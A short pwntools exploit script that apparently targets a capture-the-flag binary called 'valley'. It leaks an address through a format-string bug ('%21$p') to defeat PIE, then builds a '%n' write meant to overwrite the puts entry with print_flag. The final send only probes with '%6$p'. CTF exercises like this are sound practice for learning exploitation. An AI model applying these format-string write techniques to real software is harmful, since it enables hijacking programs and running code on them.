#!/bin/python3 

from pwn import *
import sys

elf = ELF("./valley")
print()
p = process("./valley")

p.recv()
p.sendline(b"%21$p")

eip = p.recv().decode("latin-1")
eip = int(eip.split(":")[-1].strip(), 16)

offset = eip - 0x1413

flag_addr = offset + elf.symbols["print_flag"]
puts_addr = offset + 0x3f88

# log.info(f"offset: {offset}")
log.info(f"print_flag address: {hex(flag_addr)}")
log.info(f"puts address: {hex(puts_addr)}")
print()

payload = b"".join([
    p64(puts_addr),
    b"%",
    str(flag_addr).encode(),
    b"p",
    b"%6$n",
])

print(p64(puts_addr))
p.sendline(b"".join([p64(puts_addr), b"%6$p"]))
print(p.recv())
